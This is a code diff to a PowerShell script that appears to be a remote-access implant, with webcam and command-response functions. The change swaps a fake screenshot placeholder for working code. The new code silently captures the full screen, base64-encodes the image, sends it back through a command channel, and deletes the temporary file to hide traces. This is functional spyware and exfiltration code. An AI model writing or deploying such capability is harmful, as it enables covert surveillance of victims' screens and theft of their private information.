@@ -284,16 +284,34 @@ function Invoke-WebcamClip {
 
 function Invoke-Screenshot {
     try {
-        # Placeholder for screenshot capture
+        
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        
+        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $Width  = $Screen.Width
+        $Height = $Screen.Height
+        $Left   = $Screen.Left
+        $Top    = $Screen.Top
+        
+        $bitmap  = New-Object System.Drawing.Bitmap $Width, $Height
+        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)    
+        
         $fileName = New-FileName -name 'ss' -extension 'jpg'
-        # Simulate screenshot capture
-        [byte[]]$fakeScreenshotData = [System.Text.Encoding]::UTF8.GetBytes("Fake screenshot data")
+        $bitmap.Save("$env:TEMP\\$fileName", [System.Drawing.Imaging.ImageFormat]::Jpeg)
+        $bitmap.Dispose()
+        
+        [byte[]]$image = Get-Content -Path "$env:TEMP\\$fileName" -Encoding "utf8" -AsByteStream
+
         Send-Command @{
             response = @{
                 download = $fileName
-                data = [Convert]::ToBase64String($fakeScreenshotData)
+                data = [Convert]::ToBase64String($image)
             }
         }
+
+        Remove-Item -Path "$env:TEMP\\$fileName" -Force | Out-Null
     }
     catch {
         Send-Command @{
